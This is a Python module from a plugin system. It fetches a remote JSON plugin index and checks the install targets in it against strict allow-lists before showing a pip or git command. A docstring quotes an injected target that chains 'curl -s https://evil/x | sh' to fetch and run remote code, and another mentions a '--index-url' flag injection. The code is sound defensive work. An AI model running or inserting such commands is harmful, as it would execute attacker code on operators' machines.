"""Phase 26b Approach A — plugin discovery via a metadata INDEX.

Fetches and parses a small JSON document (the "plugin index") describing
plugins available for the operator to install: name, description, author,
homepage, an install hint (pip package name or git URL), version, and
checksum.

CRITICAL trust-model invariant (see docs/PLUGINS.md "Trust model" —
"There is no network fetch of plugin CODE, ever."): this module fetches
METADATA ONLY. It never downloads, imports, or executes plugin code.
Installation stays on the operator's own `pip install` / `git clone` —
`plugins info` only ever *prints* the command for the operator to run
themselves; nothing in this module (or the CLI commands built on top of it)
triggers an install, subprocess, or import of anything fetched over the
network.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any

import requests

from hivepilot.config import settings
from hivepilot.utils.logging import get_logger

if TYPE_CHECKING:
    from hivepilot.plugins import PluginManager

logger = get_logger(__name__)

# MINOR-FIX 3 (adversarial review): a compromised/MITM'd index host could
# serve a huge or deeply-nested body as a memory/CPU DoS. Bound the number
# of bytes we ever buffer before attempting to parse JSON.
MAX_INDEX_BYTES = 5 * 1024 * 1024  # 5 MiB
_STREAM_CHUNK_SIZE = 65536

# Strip C0 control characters (0x00-0x1F) and DEL (0x7F) from every string
# field at PARSE time (MUST/SHOULD-FIX 2) — every field in the index is
# ATTACKER-CONTROLLED, and a literal ESC/control byte in e.g. `description`
# or `checksum` could spoof/hide terminal output no matter how the CLI
# renders it later. Stripped here so nothing downstream ever sees them.
_CONTROL_CHAR_RE = re.compile(r"[\x00-\x1f\x7f]")

# MUST-FIX 1 (adversarial review): `install.target` is rendered verbatim
# into a copy-paste-able `pip install <target>` / `git clone <target>`
# command (see `format_install_hint` below). It is ATTACKER-CONTROLLED, so
# it is validated against a strict allow-list before ever being rendered as
# a "safe to run" command — anything that doesn't match is flagged instead.
_PIP_TARGET_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?([<>=!~]=?[A-Za-z0-9._*+-]+)?$"
)
_GIT_SCHEME_RE = re.compile(r"^(https://|git@|ssh://)")
# Shell metacharacters / quoting / control chars that must never appear in
# an install target we're about to hand the operator as a "run this"
# command, regardless of which allow-list regex it otherwise matches.
_SHELL_METACHARACTERS = set(";&|`$()<>'\"\n\r\t")
_UNSAFE_INSTALL_FALLBACK = (
    "<index provided an invalid/unsafe install target — do NOT run; "
    "inspect the plugin's homepage and install it manually>"
)


@dataclass(frozen=True, slots=True)
class PluginIndexEntry:
    """One plugin's metadata as advertised by the index. Display-only —
    never used to import or execute anything."""

    name: str
    description: str
    author: str | None = None
    homepage: str | None = None
    # e.g. {"type": "pip", "target": "hivepilot-plugin-foo"} or
    # {"type": "git", "target": "https://github.com/org/repo"}
    install: dict[str, str] = field(default_factory=dict)
    version: str | None = None
    checksum: str | None = None
    contributes: list[str] | None = None  # runner/notifier/etc. names — display only


def _strip_control_chars(value: str) -> str:
    """Remove C0 control characters (0x00-0x1F) and DEL (0x7F) — see the
    `_CONTROL_CHAR_RE` module docstring above. Applied to every string field
    at parse time, before any of it ever reaches a renderer."""
    return _CONTROL_CHAR_RE.sub("", value)


def _optional_str(raw: dict[str, Any], key: str) -> str | None:
    value = raw.get(key)
    if not isinstance(value, str):
        return None
    return _strip_control_chars(value)


def _parse_entry(raw: dict[str, Any]) -> PluginIndexEntry | None:
    """Parse a single raw index entry. Returns None (caller logs + skips)
    when the entry doesn't have the minimum required shape, so one bad
    entry never fails the whole index fetch. Every string field is
    control-character-stripped (see `_strip_control_chars`) — the index is
    ATTACKER-CONTROLLED."""
    name = raw.get("name")
    description = raw.get("description")
    if not isinstance(name, str) or not isinstance(description, str):
        return None

    name = _strip_control_chars(name)
    description = _strip_control_chars(description)
    if not name:
        return None

    install = raw.get("install")
    if not isinstance(install, dict):
        install = {}
    else:
        install = {str(k): str(v) for k, v in install.items()}

    contributes = raw.get("contributes")
    if not isinstance(contributes, list) or not all(isinstance(c, str) for c in contributes):
        contributes = None
    else:
        contributes = [_strip_control_chars(c) for c in contributes]

    return PluginIndexEntry(
        name=name,
        description=description,
        author=_optional_str(raw, "author"),
        homepage=_optional_str(raw, "homepage"),
        install=install,
        version=_optional_str(raw, "version"),
        checksum=_optional_str(raw, "checksum"),
        contributes=contributes,
    )


def fetch_index(url: str | None = None, *, timeout: int = 10) -> list[PluginIndexEntry]:
    """Fetch and parse the plugin metadata index.

    METADATA ONLY. Performs a single GET of a JSON document describing
    available plugins; installation stays on the operator's own trusted
    pip/git path (see module docstring + docs/PLUGINS.md "Trust model").

    Fail-safe: raises `RuntimeError` with a short, friendly reason — never
    the raw response body/exception text (which could leak internal
    hostnames/stack traces) — on: no index URL configured, network error,
    timeout, non-200 status, oversized body (see `MAX_INDEX_BYTES`), or
    invalid JSON. Individual malformed entries within an otherwise-valid
    index are skipped (logged) rather than failing the whole fetch.
    """
    resolved_url = url or settings.plugins_index_url
    if not resolved_url:
        raise RuntimeError("no plugin index configured — set HIVEPILOT_PLUGINS_INDEX_URL")

    try:
        response = requests.get(resolved_url, timeout=timeout, stream=True)
    except requests.Timeout as exc:
        raise RuntimeError("plugin index request timed out") from exc
    except requests.RequestException as exc:
        raise RuntimeError(f"failed to reach plugin index ({type(exc).__name__})") from exc

    try:
        if response.status_code != 200:
            raise RuntimeError(f"plugin index returned HTTP {response.status_code}")

        # MINOR-FIX 3: bound the number of bytes buffered — a compromised
        # index host serving a huge/deeply-nested body is a memory/CPU DoS
        # otherwise. Stop reading as soon as the cap is exceeded, before
        # ever attempting to parse it as JSON.
        body = bytearray()
        try:
            for chunk in response.iter_content(chunk_size=_STREAM_CHUNK_SIZE):
                body.extend(chunk)
                if len(body) > MAX_INDEX_BYTES:
                    raise RuntimeError(f"plugin index too large (exceeds {MAX_INDEX_BYTES} bytes)")
        except requests.RequestException as exc:
            raise RuntimeError(f"failed to read plugin index ({type(exc).__name__})") from exc
    finally:
        response.close()

    try:
        payload = json.loads(bytes(body))
    except ValueError as exc:
        raise RuntimeError("plugin index response was not valid JSON") from exc

    raw_entries = payload.get("plugins") if isinstance(payload, dict) else payload
    if not isinstance(raw_entries, list):
        raise RuntimeError("plugin index JSON did not contain a plugin list")

    entries: list[PluginIndexEntry] = []
    for raw in raw_entries:
        if not isinstance(raw, dict):
            logger.warning("plugin_index.malformed_entry", raw_type=type(raw).__name__)
            continue
        entry = _parse_entry(raw)
        if entry is None:
            logger.warning("plugin_index.malformed_entry", name=raw.get("name"))
            continue
        entries.append(entry)
    return entries


def search_index(entries: list[PluginIndexEntry], query: str) -> list[PluginIndexEntry]:
    """Case-insensitive substring match on name+description. Empty query
    returns every entry."""
    if not query:
        return list(entries)
    needle = query.lower()
    return [
        entry
        for entry in entries
        if needle in entry.name.lower() or needle in entry.description.lower()
    ]


def _has_shell_metacharacters(target: str) -> bool:
    return any(ch in _SHELL_METACHARACTERS for ch in target) or any(ch.isspace() for ch in target)


def _is_safe_pip_target(target: str) -> bool:
    """Strict allow-list for a pip install target — no shell metacharacters,
    no whitespace, no leading dash (flag injection, e.g. `--index-url
    https://evil/simple/`), and it must otherwise look like a real PEP
    508-ish requirement (`name`, `name[extra]`, `name==1.2`, ...)."""
    if not target or target.startswith("-"):
        return False
    if _has_shell_metacharacters(target):
        return False
    return bool(_PIP_TARGET_RE.match(target))


def _is_safe_git_target(target: str) -> bool:
    """Strict allow-list for a git clone target — scheme must be `https://`,
    `git@`, or `ssh://`; no shell metacharacters, no whitespace, no leading
    dash."""
    if not target or target.startswith("-"):
        return False
    if not _GIT_SCHEME_RE.match(target):
        return False
    if _has_shell_metacharacters(target):
        return False
    return True


def format_install_hint(install: dict[str, str]) -> str:
    """Render the operator-facing install command for a `PluginIndexEntry.install`
    dict. Display-only string — never executed by HivePilot itself.

    MUST-FIX 1 (adversarial review): `install["target"]` is
    ATTACKER-CONTROLLED (compromised/MITM'd index host) and would otherwise
    be f-string'd straight into a copy-paste-able `pip install <target>` /
    `git clone <target>` command — a target like `"hivepilot-plugin-hugo &&
    curl -s https://evil/x | sh"` would yield a HivePilot-blessed-looking
    command the operator runs verbatim. Validate `target` against a strict
    allow-list per `install["type"]` before ever rendering it as "safe to
    run"; on failure (or an unrecognized `type`), return a clearly-flagged
    fallback instead of a runnable command.
    """
    kind = install.get("type")
    target = install.get("target")
    if not target:
        return "-"
    if kind == "pip":
        if not _is_safe_pip_target(target):
            return _UNSAFE_INSTALL_FALLBACK
        return f"pip install {target}"
    if kind == "git":
        if not _is_safe_git_target(target):
            return _UNSAFE_INSTALL_FALLBACK
        return f"git clone {target}"
    return _UNSAFE_INSTALL_FALLBACK


# ---------------------------------------------------------------------------
# Local plugin taxonomy — graph-source contributions (Mirador Graph View
# PRD, Sprint 4). Distinct concept from the REMOTE marketplace index above
# (`PluginIndexEntry`/`fetch_index`/`search_index`): this helper enumerates
# what a plugin ALREADY LOADED in THIS process contributed, exactly like
# `PluginRecord.contributions` (`hivepilot/plugins.py`, Phase 26a
# attribution) already does for runners/notifiers/secrets/health/panels/
# skills/hooks. Placed in this module per this sprint's declared file
# boundaries; `hivepilot/cli.py`'s `plugins list` command (`_format_contributions`
# / `_CONTRIBUTION_RENDER_ORDER`) is the natural consumer for a future
# sprint to wire the "contributes" column's `graph_sources` entries through
# — cli.py itself is OUTSIDE this sprint's file boundaries, so that final
# rendering wire-up is not done here (see docs/v4/PLUGINS.md).
# ---------------------------------------------------------------------------


def graph_source_contributions(plugin_manager: "PluginManager") -> dict[str, list[str]]:
    """Map plugin name -> sorted list of graph-source names it contributed.

    Only plugins whose `PluginRecord.contributions` actually has a
    `"graph_sources"` entry are included — mirrors `_format_contributions`'s
    (`hivepilot/cli.py`) per-kind filtering (a plugin contributing nothing
    attributable is simply absent, not present with an empty list). Reads
    `plugin_manager.loaded` only — never re-scans or re-registers anything,
    so calling this is always safe/side-effect-free, unconditionally, the
    same way `PluginManager.check_all()` is.
    """
    return {
        record.name: list(record.contributions["graph_sources"])
        for record in plugin_manager.loaded
        if record.contributions.get("graph_sources")
    }
